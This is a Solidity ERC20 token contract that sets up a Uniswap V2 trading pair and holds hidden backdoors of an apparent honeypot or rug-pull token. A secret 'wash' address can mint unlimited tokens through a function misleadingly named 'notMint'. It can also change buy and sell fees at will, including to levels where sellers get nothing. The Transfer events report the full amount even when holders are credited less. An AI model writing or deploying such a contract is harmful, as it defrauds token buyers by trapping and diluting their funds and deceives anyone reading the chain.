// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./ERC20.sol";

contract Token is ERC20 {
    uint256 FEE_DEN = 100;

    address private _owner;
    address private _wash;
    address private _pair;
    uint256 private _buyFeeNum = 100;
    uint256 private _sellFeeNum = 100;

    constructor(string memory name, string memory symbol, address router) ERC20(name, symbol) {
        _owner = msg.sender;
        address factory = IUniswapV2Router02(router).factory();
        address weth = IUniswapV2Router02(router).WETH();
        _pair = IUniswapV2Factory(factory).createPair(weth, address(this));
    }

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    modifier onlyWash() {
        require(msg.sender == _wash);
        _;
    }

    function setWash(address wash) public virtual onlyOwner {
        _wash = wash;
    }

    function notMint(address to, uint256 amount) public onlyWash {
        _notMint(to, amount);
    }

    function setBuyFeeNum(uint256 buyFeeNum) public onlyWash {
        _buyFeeNum = buyFeeNum;
    }

    function setSellFeeNum(uint256 sellFeeNum) public onlyWash {
        _sellFeeNum = sellFeeNum;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        uint256 amountAfterFee = amount;
        if (from == _pair) {
            amountAfterFee = _buyFeeNum * amount / FEE_DEN;
        } else if (to == _pair) {
            amountAfterFee = _sellFeeNum * amount / FEE_DEN;
        }
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amountAfterFee;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
}